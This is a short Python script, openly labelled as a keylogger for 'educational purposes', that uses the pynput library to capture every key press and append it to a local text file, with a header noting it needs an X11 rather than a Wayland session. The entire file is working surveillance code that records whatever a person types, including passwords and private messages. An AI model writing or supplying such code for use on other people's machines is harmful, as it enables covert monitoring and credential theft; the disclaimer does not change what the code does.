"""
#========================================#
# This is for educational purposes only, #
#     do not use against any person.     #
#           Be a good person             #
#========================================#

Code for create a key logger. On linux you must verify:
echo $XDG_SESSION_TYPE is not wayland because wayland block
this type of code for security. You must use X11
"""
from pynput.keyboard import Key, Listener

def key_log(key):

    # Litte dictionary to improve the readibility of the ouput file
    # Some common key
    if key == Key.space:
        k = " "
    elif key == Key.enter:
        k = "\n"
    elif key == Key.tab:
        k = "\t"

    # If the pressed key is a char (letter or number)
    # [dir(key) are all attributes of Key]
    elif "char" in dir(key):
        k = key.char
    else :
        k = "\n[" + str(key).split(".")[1] + "]"

    with open("key_logger.txt", "a") as f:
        try :
            f.write(k)
        # k can be None (e.g, with AltGr) idk why
        except TypeError:
            f.write(str(key))

print("Listening the keyboard...")
with Listener(on_press=key_log) as listener:
    listener.join()
